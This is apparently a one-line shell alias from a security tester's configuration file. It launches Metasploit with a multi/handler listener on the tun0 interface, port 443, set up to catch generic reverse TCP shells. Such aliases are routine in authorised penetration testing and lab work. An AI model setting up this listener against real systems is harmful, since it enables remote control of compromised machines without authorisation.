alias msftun="msfconsole -a -x 'setg lhost tun0; setg lport 443; use exploit/multi/handler; set payload generic/shell_reverse_tcp'"
